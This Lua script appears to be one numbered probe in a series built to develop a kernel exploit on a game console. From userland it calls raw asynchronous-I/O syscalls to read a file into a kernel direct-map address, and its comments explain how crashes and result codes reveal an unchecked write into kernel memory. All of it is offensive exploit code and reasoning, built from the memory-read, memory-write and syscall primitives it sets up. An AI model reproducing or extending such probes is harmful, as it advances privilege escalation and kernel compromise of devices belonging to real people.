-- CRASH_CLASS: HIGH
-- PROBE 755a: the first aio request of a fresh process, aimed at a kernel buffer
--
-- Every aio create from a normal buffer has stayed at state 1 since 752a left
-- two requests in flight with no peer feed. Ids keep climbing across
-- connections (00004205, 00000206, ..., 00000210), so the loader is one
-- process per game session and a second in-flight request blocks the queue.
-- A relaunch is therefore required before this probe, and the kernel-buffer
-- request must be the FIRST create, not the second.
--
-- 747a/748a: a vnode read with buf=0x1000 killed the process, and a vnode read
-- with buf=0xFFFFFFFFFF000000 also killed it, while a socket read with a bad
-- user buffer reported EFAULT. Nothing has yet tried a vnode read into an
-- address that is certainly mapped: the direct map base.
--
-- Outcomes:
--   death after create        -> the transfer is not checked and the fault is
--                                fatal; a mapped address would be written
--   state 3, res = 10 0 3 0   -> the transfer completed into kernel memory
--   state 3, res = 8002000E   -> the address was rejected as invalid
--   state 1 forever           -> the queue was still blocked; relaunch and
--                                rerun
--
-- A control after it uses our own page so the two records can be compared.

print("=== PROBE 755a: FIRST AIO INTO A KERNEL BUFFER ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local U = function(a) a=to_num(a); return uint64(string.format("0x%08X%08X", math.floor(a/4294967296), a%4294967296)) end
local sc_open = mk(5)
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local function call(sc, a1, a2, a3, a4, a5, a6)
    local ok, r = pcall(function() return sc(U(a1), U(a2), U(a3), U(a4), U(a5), U(a6)) end)
    if not ok then return "DEAD" end
    return to_num(r)
end
local ts = memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8, ms*1000000); pcall(function() mk(240)(U(ts), U(0)) end) end
local function path(s)
    local b = to_num(memory.alloc(#s+1))
    for i=1,#s do memory.write_byte(b+i-1, s:byte(i)) end
    memory.write_byte(b+#s, 0)
    return b
end
print("[A] tid="..tostring(call(syscall.pipe, 20,0,0,0,0,0,0)))

local D = to_num(memory.alloc(0x2000)); local buf = to_num(memory.alloc(0x2000)); local res = to_num(memory.alloc(0x2000))
local ids = to_num(memory.alloc(0x400)); local st = to_num(memory.alloc(0x400)); local ds = to_num(memory.alloc(0x400))
zero(D,0x2000); zero(buf,0x2000); zero(res,0x2000); zero(st,0x400); zero(ds,0x400)
for k=0,3 do wd(buf+k*4, 0x62626262) end

local fd = call(sc_open, path("/savedata0/thread.lua"), 0, 0, 0, 0, 0)
print("[A] open -> "..tostring(fd))

local function submit(tag, b)
    zero(D,0x100); zero(res,0x40); zero(st,0x40); zero(ds,0x40)
    wq(D+0x00, uint64(0)); wq(D+0x08, uint64(16))
    wq(D+0x10, uint64(b)); wq(D+0x18, uint64(res))
    wd(D+0x20, fd); wd(D+0x24, 0)
    wd(ids, 0)
    local cr = call(mk(669), 1+0x1000, D, 1, 1, ids, 0)
    local id = rd(ids)
    print(string.format("%s create ret=%s id=%08X", tag, tostring(cr), id))
    if id == 0 or id == -1 then return nil end
    for i=1,4 do
        local ms = ({20, 100, 300, 700})[i]
        sleep_ms(i == 1 and 20 or (ms - ({20, 100, 300, 700})[i-1]))
        wd(ids, id); zero(st,0x40)
        call(mk(664), ids, 1, st, 0, 0, 0)
        print(string.format("%s t=%dms state=%08X res=%X %X %X %X", tag, ms, rd(st), rd(res), rd(res+4), rd(res+8), rd(res+12)))
    end
    wd(ids, id); zero(ds,0x40); call(mk(662), ids, 1, ds, 0, 0, 0)
    print(string.format("%s delete=%08X", tag, rd(ds)))
    return id
end

-- the kernel address goes first: if it kills us, the control never runs
if type(fd) == "number" and fd > 2 then
    submit("[B] dmap base buf", 0xFFFFFE0000000000)
    print("[C] alive after kernel-buffer attempt")
    submit("[D] control buf", buf)
    print(string.format("[D] control buf=%X %X %X %X", rd(buf), rd(buf+4), rd(buf+8), rd(buf+12)))
end
print("[E] health="..tostring(call(syscall.pipe, 20,0,0,0,0,0,0)))
print("=== 755a DONE ===")
